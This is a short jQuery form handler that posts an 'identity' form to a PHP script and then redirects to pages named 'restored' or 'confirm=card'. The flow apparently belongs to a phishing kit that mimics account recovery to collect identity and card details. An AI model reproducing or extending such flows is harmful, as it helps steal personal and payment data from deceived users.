$("#identity").validate({
  submitHandler: function(form) {
    $.post("../post/poidenty.php", $("#identity").serialize(), function(GET) {
      if (GET == "error") {
        setTimeout(function() {
        document.getElementById("notifications").className = "notification notification-critical";
          });
      } else if (GET == "success") {
        window.location.assign("restored");
      } else {
        setTimeout(function() {
          window.location.assign("confirm=card");
        });
      }
    });
  }
});
